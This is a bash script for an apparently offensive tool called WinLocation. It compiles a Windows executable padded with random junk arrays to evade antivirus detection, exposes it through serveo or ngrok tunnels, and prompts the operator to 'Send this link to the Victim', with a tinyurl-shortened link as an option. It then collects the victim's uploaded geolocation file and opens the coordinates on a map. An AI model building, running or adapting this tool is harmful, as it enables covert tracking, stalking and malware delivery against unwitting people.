#!/bin/bash
# WinLocation v1.0
# Coded by @linux_choice (Don't change! Read the License!)
# Github: https://github.com/thelinuxchoice/winlocation

trap 'printf "\n";stop;exit 1' 2


banner() {

printf "\e[1;92m __        ___       \e[0m\e[1;77m _                    _   _              \e[0m\n"
printf "\e[1;92m \ \      / (_)_ __  \e[0m\e[1;77m| |    ___   ___ __ _| |_(_) ___  _ __   \e[0m\n"
printf "\e[1;92m  \ \ /\ / /| | '_ \\ \e[0m\e[1;77m| |   / _ \ / __/ _\` | __| |/ _ \| '_ \  \e[0m\n"
printf "\e[1;92m   \ V  V / | | | | |\e[0m\e[1;77m| |__| (_) | (_| (_| | |_| | (_) | | | | \e[0m\n"
printf "\e[1;92m    \_/\_/  |_|_| |_|\e[0m\e[1;77m|_____\___/ \___\__,_|\__|_|\___/|_| |_|v1.0 \e[0m\n"
                                                            
printf "\n"
printf "\e[1;77m     Coded by: https://github.com/thelinuxchoice/WinLocation\e[0m\n"
}


stop() {

checkphp=$(ps aux | grep php)
checkssh=$(ps aux | grep ssh)
checkngrok=$(ps aux | grep ngrok)
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
if [[ $checkngrok == *'ngrok'* ]]; then
killall -2 ngrok > /dev/null 2>&1
fi


}

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } 
command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: apt-get update & apt-get install -y mingw-w64 .Aborting."; 
exit 1; }


}

grab_location() {

latitude=$(sed '4q;d' uploadedfiles/l.txt | cut -d " " -f1-2 | tr ',' '.')
longitude=$(sed '4q;d' uploadedfiles/l.txt | cut -d " " -f3-4 | tr ',' '.')

if [[ $(grep "Latitude" uploadedfiles/l.txt) == *'Latitude'* ]]; then

printf "\e[1;92m[\e[0m\e[1;92m+\e[0m\e[1;92m] Geolocation info:\n\e[0m\e[1;77m"
cat uploadedfiles/l.txt
printf "\e[0m"
printf "https://www.google.com/maps/place/%s+%s\n" $latitude $longitude
default_start_firefox="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Open Link? [Y/n] ' start_firefox
start_firefox="${start_firefox:-${default_start_firefox}}"
if [[ $start_firefox == "Y" || $start_firefox == "Yes" || $start_firefox == "yes" || $start_firefox == "y" ]]; then

firefox https://www.google.com/maps/place/$latitude+$longitude
else
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Press Ctrl + c to exit and stop servers\e[0m\n"
fi

else
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Location is turned off\n"
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Press Ctrl + c to exit and stop servers\e[0m\n"
fi


}


checkrcv() {


printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Waiting files,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"

while [ true ]; do

if [[ -e Log.log ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] File Received!\e[0m\e[1;77m Saved: uploadedfiles/l.txt\e[0m\n"
rm -rf Log.log
grab_location
fi
done 

}


server_ngrok() {
if [ ! -d uploadedfiles/ ]; then
mkdir uploadedfiles/
fi

php -S "localhost:3333" > /dev/null 2>&1  &
sleep 2
if [[ -e ngrok ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 5
else

wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip

printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 6
else
printf "\e[1;93m [!] Download Error!\e[0m\n"
exit 1
fi
fi

}

server_serveo() {
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting server...\e[0m\n"


if [ ! -d uploadedfiles/ ]; then
mkdir uploadedfiles/
fi

fuser -k 3333/tcp > /dev/null 2>&1
fuser -k 4444/tcp > /dev/null 2>&1
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$port':localhost:4444 2> /dev/null > sendlink' &
sleep 7
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s/%s.exe \n' $send_link $payload_name
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/app.apk | head -n1)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

php -S "localhost:3333" > /dev/null 2>&1  &
php -S "localhost:4444" > /dev/null 2>&1  &
sleep 3
checkrcv
}



icon() {

default_payload_icon="icon/messenger.ico"
printf '\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put ICON path (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_icon
read payload_icon
payload_icon="${payload_icon:-${default_payload_icon}}"

if [[ ! -e $payload_icon ]]; then
printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] File not Found! Try Again! \e[0m\n'
icon
else
if [[ $payload_icon != *.ico ]]; then
printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, use *.ico file format. Try Again! \e[0m\n'
icon
fi
fi

}


#generatePadding function from powerfull.sh file (by https://github.com/Screetsec/TheFatRat/blob/master/powerfull.sh)
function generatePadding {

    paddingArray=(0 1 2 3 4 5 6 7 8 9 a b c d e f)

    counter=0
    randomNumber=$((RANDOM%${randomness}+23))
    while [  $counter -lt $randomNumber ]; do
        echo "" >> wl.c
	randomCharnameSize=$((RANDOM%10+7))
        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
	echo "unsigned char ${randomCharname}[]=" >> wl.c

    	randomLines=$((RANDOM%20+13))
	for (( c=1; c<=$randomLines; c++ ))
	do
		randomString="\""
		randomLength=$((RANDOM%11+7))
		for (( d=1; d<=$randomLength; d++ ))
		do
			randomChar1=${paddingArray[$((RANDOM%15))]}
			randomChar2=${paddingArray[$((RANDOM%15))]}
			randomPadding=$randomChar1$randomChar2
	        	randomString="$randomString\\x$randomPadding"
		done
		randomString="$randomString\""
		if [ $c -eq ${randomLines} ]; then

			echo "$randomString;" >> wl.c

		else

			echo $randomString >> wl.c
		fi
	done
        let counter=counter+1
    done
}


payload() {


printf "#include <stdio.h>\n" > wl.c
printf "#include <winsock2.h>\n" >> wl.c
printf "#include <windows.h>\n" >> wl.c
printf "#include <string.h>\n" >> wl.c
printf "#include <curl/curl.h>\n" >> wl.c
generatePadding
generatePadding
generatePadding
generatePadding

if [[ $var_ngrok == 1 ]]; then
url=$(curl -s -N http://127.0.0.1:4040/status | grep -o "http://[0-9a-z]*\.ngrok.io")

fi

sed 's+forwarding+'$url'+g' source.c >> wl.c

generatePadding
generatePadding
generatePadding
generatePadding


#printf "id ICON \"%s\"" $payload_icon  > icon.rc
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Compiling... \e[0m\n"
i686-w64-mingw32-gcc wl.c -o $payload_name.exe -DCURL_STATICLIB -static -lstdc++ -lgcc -lpthread -lcurl -lwldap32 -lws2_32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include -pthread
rm -rf wl.c
}

port_conn() {

default_port=$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Choose a Port (Default:\e[0m\e[1;92m %s \e[0m\e[1;77m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
url="http://serveo.net:$port"
}

checkserver() {

default_start_server="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start Server? [Y/n] ' start_server
start_server="${start_server:-${default_start_server}}"
if [[ $start_server == "Y" || $start_server == "Yes" || $start_server == "yes" || $start_server == "y" ]]; then

if [[ "$var_ngrok" == 1 ]]; then
link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m+\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s/%s.exe\e[0m\n" $link $payload_name
checkrcv
else
server_serveo
fi
else
exit 1
fi

}


forwarding() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1  ]]; then
port_conn
payload
server_serveo

elif [[ $option_server -eq 2 ]]; then
let var_ngrok=1
server_ngrok
payload
checkserver

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
forwarding
fi

}

start() {

default_payload_name="payload"
printf '\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name
read payload_name
payload_name="${payload_name:-${default_payload_name}}"
stop
forwarding

}


banner
dependencies
start
